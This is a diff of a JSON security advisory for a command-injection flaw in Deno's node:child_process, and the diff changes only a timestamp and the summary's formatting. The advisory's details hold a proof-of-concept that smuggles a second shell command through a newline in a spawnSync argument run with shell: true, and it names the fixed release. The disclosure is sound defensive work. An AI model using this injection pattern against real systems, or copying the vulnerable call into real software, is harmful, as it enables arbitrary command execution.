@@ -1,14 +1,14 @@
 {
     "schema_version": "1.8.0",
     "id": "JLSEC-2026-116",
-    "modified": "2026-07-17T23:50:43.660Z",
+    "modified": "2026-07-23T22:21:26.455Z",
     "published": "2026-04-14T13:10:46.494Z",
     "upstream": [
         "CVE-2026-27190",
         "GHSA-hmh4-3xvx-q5hr",
         "EUVD-2026-7794"
     ],
-    "summary": "Deno has a Command Injection via Incomplete shell metacharacter blocklist in node:child_process",
+    "summary": "Deno has a Command Injection via Incomplete shell metacharacter blocklist in `node:child_process`",
     "details": "## Summary\n\nA command injection vulnerability exists in Deno's `node:child_process` implementation.\n\n## Reproduction\n\n```javascript\nimport { spawnSync } from \"node:child_process\";\nimport * as fs from \"node:fs\";\n\n// Cleanup\ntry { fs.unlinkSync('/tmp/rce_proof'); } catch {}\n\n// Create legitimate script\nfs.writeFileSync('/tmp/legitimate.ts', 'console.log(\"normal\");');\n\n// Malicious input with newline injection\nconst maliciousInput = `/tmp/legitimate.ts\\ntouch /tmp/rce_proof`;\n\n// Vulnerable pattern\nspawnSync(Deno.execPath(), ['run', '--allow-all', maliciousInput], {\n  shell: true,\n  encoding: 'utf-8'\n});\n\n// Verify\nconsole.log('Exploit worked:', fs.existsSync('/tmp/rce_proof'));\n```\n\nRun: `deno run --allow-all poc.mjs`\n\nThe file `/tmp/rce_proof` is created, confirming arbitrary command execution.\n\n## Mitigation\n\nAll users need to update to the patched version (Deno v2.6.8).",
     "severity": [
         {
